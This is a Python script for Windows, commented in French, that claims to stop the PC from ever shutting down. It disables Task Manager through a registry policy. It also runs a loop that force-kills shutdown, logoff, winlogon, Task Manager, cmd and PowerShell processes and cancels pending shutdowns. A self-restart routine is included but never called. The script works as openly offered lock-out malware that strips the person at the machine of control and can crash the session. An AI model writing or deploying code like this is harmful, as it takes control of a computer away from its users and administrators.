import ctypes
import os
import time
import winreg
import psutil
import datetime
import getpass

LOG_FILE = "shutdown_log.txt"

# 1️⃣ Fonction pour enregistrer les logs des tentatives d'arrêt
def log_attempt(process_name, pid):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    user = getpass.getuser()
    log_entry = f"[{timestamp}] Tentative d'arrêt détectée - Processus : {process_name} (PID: {pid}) | Utilisateur : {user}\n"
    
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(log_entry)
    
    print(log_entry.strip())

# 2️⃣ Désactiver les touches Alt+F4 et Ctrl+Alt+Del via le Registre (nécessite admin)
def disable_shutdown_keys():
    key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as regkey:
            winreg.SetValueEx(regkey, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)  # Désactiver le gestionnaire de tâches
            winreg.SetValueEx(regkey, "ShutdownWithoutLogon", 0, winreg.REG_DWORD, 0)  # Désactiver arrêt sans connexion
            print("[INFO] Protection des raccourcis Windows activée.")
    except Exception as e:
        print(f"[ERREUR] Impossible de modifier le registre : {e}")

# 3️⃣ Empêcher les commandes d'arrêt via shutdown.exe
def prevent_shutdown():
    os.system("shutdown -a")  # Annule toute tentative en cours
    print("[INFO] Tentative d'arrêt annulée.")

# 4️⃣ Vérifier en boucle les processus pour détecter un arrêt en cours
def monitor_shutdown():
    print("[INFO] Surveillance activée : le PC ne pourra pas s'éteindre !")
    shutdown_procs = ["shutdown.exe", "logoff.exe", "winlogon.exe", "taskmgr.exe", "powershell.exe", "cmd.exe"]

    while True:
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] and proc.info['name'].lower() in shutdown_procs:
                print(f"[ALERTE] Processus suspect détecté : {proc.info['name']} (PID: {proc.info['pid']})")
                log_attempt(proc.info['name'], proc.info['pid'])
                prevent_shutdown()
                os.system(f"taskkill /F /PID {proc.info['pid']}")  # Tue le processus
        time.sleep(1)  # Vérification toutes les secondes

# 5️⃣ Éviter la fermeture du script
def protect_script():
    while True:
        if not "python.exe" in (p.name().lower() for p in psutil.process_iter()):
            os.system("start /B python " + __file__)  # Redémarrer le script si fermé
        time.sleep(2)

if __name__ == "__main__":
    disable_shutdown_keys()  # Appliquer les protections
    monitor_shutdown()  # Lancer la surveillance
